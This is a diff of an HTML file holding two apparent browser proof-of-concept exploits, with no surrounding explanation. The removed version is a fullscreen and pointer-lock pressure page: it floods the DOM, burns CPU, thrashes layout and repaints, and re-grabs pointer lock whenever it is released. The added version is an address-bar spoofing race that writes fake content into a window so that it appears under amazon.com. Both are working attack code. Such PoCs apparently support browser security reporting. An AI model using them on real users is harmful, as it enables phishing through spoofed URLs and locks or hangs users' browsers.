@@ -1,196 +1,31 @@
-<!DOCTYPE html>
-<html lang="en">
 <head>
-<meta charset="UTF-8">
-<title>ULTRA UX PRESSURE PoC</title>
-<style>
-  body { margin:0; overflow:hidden; font-family:Arial; }
-
-  #start {
-    position:fixed; inset:0;
-    display:flex; align-items:center; justify-content:center;
-    background:#111; color:#fff; font-size:2em;
-    z-index:1000002; cursor:pointer;
-  }
-
-  #overlay {
-    position:fixed; inset:0;
-    background:#000; color:#fff;
-    display:none; z-index:999999;
-  }
-
-  #note {
-    position:fixed; top:10px; left:10px;
-    background:#fff; color:red;
-    padding:6px 10px; z-index:1000000;
-  }
-
-  #list {
-    position:absolute;
-    top:0; left:0;
-    width:100vw; height:100vh;
-    overflow:auto;
-    font-size:1.2em;
-  }
-
-  #toast {
-    position:fixed;
-    bottom:20px; left:50%;
-    transform:translateX(-50%);
-    background:orange; color:black;
-    padding:10px;
-    opacity:0;
-    z-index:1000001;
-  }
-
-  html:fullscreen { cursor:none; }
-
-  #cursorSim {
-    position:absolute;
-    width:12px; height:12px;
-    background:red;
-    border-radius:50%;
-    z-index:1000003;
-    pointer-events:none;
-  }
-</style>
+  <meta name="viewport" content="width=device-width, initial-scale=1">
 </head>
 
 <body>
-
-<div id="start">CLICK TO START</div>
-
-<div id="overlay">
-  <div id="note">Observe fullscreen indicator visibility</div>
-  <div id="list"></div>
-</div>
-
-<div id="toast">UI delay active</div>
-<div id="cursorSim"></div>
-
-<script>
-const start = document.getElementById("start");
-const overlay = document.getElementById("overlay");
-const list = document.getElementById("list");
-const toast = document.getElementById("toast");
-const cursor = document.getElementById("cursorSim");
-
-let x = innerWidth/2;
-let y = innerHeight/2;
-
-start.onclick = () => {
-  start.remove();
-
-  // fullscreen + pointer lock
-  document.documentElement.requestFullscreen();
-  document.documentElement.requestPointerLock();
-
-  overlay.style.display = "block";
-
-  startAll();
-};
-
-// ===== MAIN CHAOS ENGINE =====
-function startAll(){
-  domFlood();
-  cpuBurn();
-  layoutThrash();
-  repaintSpam();
-  cursorDrift();
-  toastRace();
-}
-
-// ===== 1. MASSIVE DOM FLOOD =====
-function domFlood(){
-  let i = 0;
-  function loop(){
-    const frag = document.createDocumentFragment();
-
-    for(let j=0;j<400;j++){
-      const el = document.createElement("div");
-      el.textContent = "ITEM " + (i++);
-      el.style.transform = `scale(${Math.random()+0.5})`;
-      el.style.padding = (Math.random()*4)+"px";
-      frag.appendChild(el);
-    }
-
-    list.appendChild(frag);
-
-    // force reflow
-    list.offsetHeight;
-
-    if(i < 40000) requestAnimationFrame(loop);
-  }
-  loop();
-}
-
-// ===== 2. CPU PRESSURE =====
-function cpuBurn(){
-  let t = 0;
-  function loop(){
-    for(let i=0;i<40000;i++){
-      Math.sqrt(i*i + t);
-    }
-    t++;
-    if(t < 200) requestAnimationFrame(loop);
-  }
-  loop();
-}
-
-// ===== 3. LAYOUT THRASH =====
-function layoutThrash(){
-  let flip = false;
-  function thrash(){
-    document.body.style.margin = flip ? "1px" : "0px";
-    flip = !flip;
-
-    // force style calc
-    getComputedStyle(document.body).margin;
-
-    requestAnimationFrame(thrash);
-  }
-  thrash();
-}
-
-// ===== 4. REPAINT SPAM =====
-function repaintSpam(){
-  function paint(){
-    document.body.style.backgroundColor =
-      `rgb(${Math.random()*255},${Math.random()*255},${Math.random()*255})`;
-
-    requestAnimationFrame(paint);
-  }
-  paint();
-}
-
-// ===== 5. CURSOR DRIFT =====
-function cursorDrift(){
-  function move(){
-    y -= 1.5;
-    if(y < 0) y = 0;
-
-    cursor.style.left = x + "px";
-    cursor.style.top = y + "px";
-
-    requestAnimationFrame(move);
-  }
-  move();
-}
-
-// ===== 6. TOAST TIMING RACE =====
-function toastRace(){
-  setTimeout(()=>{
-    toast.style.opacity = 1;
-  }, 150);
-}
-
-// ===== POINTER LOCK LOOP (legal) =====
-document.addEventListener("pointerlockchange", ()=>{
-  if(document.pointerLockElement !== document.documentElement){
-    document.documentElement.requestPointerLock();
-  }
-});
-</script>
-
+    <a href="javascript:window.open('https://www.amazon.com/','x');" onclick="startSpoof()">Spoof</a>
 </body>
-</html>
+    
+    <script>
+    
+    let windowSpoof;
+
+    function race() {
+      try {
+        windowSpoof.location.href !== 'about:blank';
+      }
+      catch (e) {
+        windowSpoof.location.href='https://www.google.com/csi';
+      }
+    }
+    
+    function startSpoof() {
+
+      windowSpoof = window.open("https://www.google.com:82","x");
+      windowSpoof.document.write("<h2>Your address bar has been spoofed. This is not https://www.amazon.com/</h2>");
+
+      setInterval('race()', 0);
+    
+    }
+   
+    </script>
